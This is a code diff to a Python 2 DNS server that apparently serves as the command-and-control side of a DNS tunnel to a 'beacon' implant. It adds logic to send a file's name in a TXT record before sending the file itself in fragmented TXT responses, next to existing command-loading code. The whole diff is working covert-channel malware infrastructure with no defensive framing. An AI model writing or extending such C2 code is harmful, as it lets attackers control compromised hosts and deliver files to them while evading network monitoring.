@@ -27,6 +27,8 @@ class DNSResponse:
         self.red = 0                    # number of bytes read in the file
         self.server = server
         self.frag = False               # if the file needs to be fragmented
+        self.sendName = False           # if were sending the file name to the beacon
+
 
     """
         Packs data into a binary struct to send as a
@@ -75,7 +77,9 @@ class DNSResponse:
         self.packet += struct.pack("!H", 1) # Class 2 bytes
         self.packet += struct.pack("!I", 1) # TTL 4 bytes
         if self.txt:    # load command
-            if self.f:
+            if self.sendName:
+                self.send_file_name(self.fName)
+            elif self.f:
                 self.load_file(self.fName)
                 if self.fSize == 0: # read the whole file, reset now
                     self.frag = False
@@ -92,6 +96,17 @@ class DNSResponse:
             self.packet += struct.pack("!H", 4) # RDLENGTH 2 bytes
             self.packet += struct.pack("!I", 2165670612)  # RDATA, should be IP address from A record
         
+
+    """
+        Sends the file name to the client so that it knows 
+        that its a file being sent and not regular commands
+
+        f - the name of the file
+    """
+    def send_file_name(self, f):
+        self.packet += struct.pack("!H", len(f) + 1) #RDLENGTH length of file name
+        self.packet += struct.pack("!H", len(f)) #TXTLENGTH 
+        self.packet += ''.join(struct.pack("c", x) for x in f) # loop and store name
 
     """
         Loads the data from a file into the DNS packet,
@@ -143,14 +158,24 @@ def send_response(addr, server, dnsQuery, txt):
     packet_num = 1
     print "Sending response"
     response = DNSResponse(addr, txt, server)
-    if response.fSize > 256:  # file is too large, needs to be fragmented
-        response.frag = True  # notify response
-        while response.frag:  # loop until packet is fully fragmented
-            if response.fSize <= 255: response.frag = False # last packet
+    if response.f:
+        #send over file name
+        response.sendName = True
+        response.create_packet(dnsQuery.fullNames[0], dnsQuery.qID)
+        server.sock.sendto(bytes(response.packet), addr)
+        response.sendName = False
+        # send actual file
+        if response.fSize > 256:  # file is too large, needs to be fragmented
+            response.frag = True  # notify response
+            while response.frag:  # loop until packet is fully fragmented
+                if response.fSize <= 255: response.frag = False # last packet
+                response.create_packet(dnsQuery.fullNames[0], dnsQuery.qID)
+                server.sock.sendto(bytes(response.packet), addr)
+                print "Sent packet %d..." % packet_num
+                packet_num += 1
+        else:
             response.create_packet(dnsQuery.fullNames[0], dnsQuery.qID)
             server.sock.sendto(bytes(response.packet), addr)
-            print "Sent packet %d..." % packet_num
-            packet_num += 1
     else:
         response.create_packet(dnsQuery.fullNames[0], dnsQuery.qID)
         server.sock.sendto(bytes(response.packet), addr)
